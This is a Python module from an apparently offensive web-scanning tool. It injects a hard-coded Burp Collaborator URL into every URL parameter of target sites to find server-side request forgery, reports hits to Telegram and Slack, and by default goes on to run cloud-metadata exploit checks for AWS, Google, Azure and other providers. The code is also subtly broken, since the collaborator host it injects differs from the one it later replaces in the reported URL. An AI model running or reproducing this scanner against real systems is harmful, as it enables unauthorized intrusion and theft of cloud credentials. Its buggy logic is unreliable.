#!/usr/bin/python3

import requests
import urllib3
from Sprko.ui import console, arguments
from Sprko.core import threads
from modules import sender, readData
from Sprko.core.exploit import responseVerify as exploit
from Sprko.core.checks import userErrors
from modules import splits
from time import sleep
from datetime import date

msg 			  = console.msg
status_code_color = console.status_code
length 			  = console.length
arg 			  = arguments.arg
threadsBar 		  = threads.poolBar
threads 		  = threads.pool
urls 			  = splits.urls_split # changed all parms value to [FUZZ007] one by one
day_today 		  = date.today()

telegram_config   = readData.sender('telegram')
slack_config   	  = readData.sender('slack')

telegram_bot 	  = telegram_config['bot_api']
telegram_chat	  = telegram_config['chat_id']
slack_secret 	  = slack_config['secret']

# skip ssl errors
urllib3.disable_warnings()

class ssrf():
	def __init__(self):
		self.checks_ssrf_found = []
		checkErrors = userErrors.inputs()
		if arg.bar:
			threadsBar(arguments.max_threads, urls, self.execute)
		else:
			threads(arguments.max_threads, urls, self.execute)

		if len(self.checks_ssrf_found) < 1:
			print(msg.faield("No ssrf found"))

	def discover(self, url):
		try:
			url = url.replace("FUZZ007", "http://zeh3mov0ric2n9b9p4on4luwangd42.burpcollaborator.net/")

			response = requests.get(url, verify=False, timeout=20, allow_redirects=False, headers=None)
			
			# print log if -l, --log
			if arg.logs: 
				print(msg.log(response.url+" "+status_code_color(response.status_code)) + length(response.content))

			# check ssrf found ! , by some static burp subdomain collobrator
			if "w0d14oadc3zgs6nrb8qi38zjigz" in response.text:
				ssrfURL = url.replace("https://v2y8uryq3c1lcabnccvt90mct3zxnm.burpcollaborator.net","[SSRF]")
				return ssrfURL
		
		except Exception as e:
			# print("error main.py: [1] \t", e)
			of = open("log/errors.log", "a+")
			wf = of.writelines(url+": "+str(e)+"\n")
			cf = of.close()


	def execute(self, url):
		ssrfURL = self.discover(url)

		if ssrfURL is not None:
			print(msg.medium('(Pottential SSRF) '), ssrfURL)
			
			# tell tool i have ssrf or no
			if len(self.checks_ssrf_found) < 1:
				self.checks_ssrf_found.append(1)
			
			if arg.report:
				sender.contact.telegram(sender.telegram_bot_api, sender.telegram_chat_id, str(day_today)+"\n[MEDIUM](Pottential SSRF): {}".format(ssrfURL))
				sender.contact.slack(sender.slack_secret, str(day_today)+"\n[MEDIUM](Pottential SSRF): {}".format(ssrfURL))
			
			if arg.output:
				of = open(arg.output,"a+")
				wf = of.writelines(("[MEDIUM](Pottential SSRF) "+ssrfURL+"\n"))
				cf = of.close()
			
			if not arg.no_exploit:
				exploit.cloudCheck(ssrfURL, "aws")
				exploit.cloudCheck(ssrfURL, "google")
				exploit.cloudCheck(ssrfURL, "azure")
				exploit.cloudCheck(ssrfURL, "digital_osean")
				exploit.cloudCheck(ssrfURL, "packet_cloud")
				exploit.cloudCheck(ssrfURL, "oracle_cloud")
				exploit.cloudCheck(ssrfURL, "alibaba_cloud")


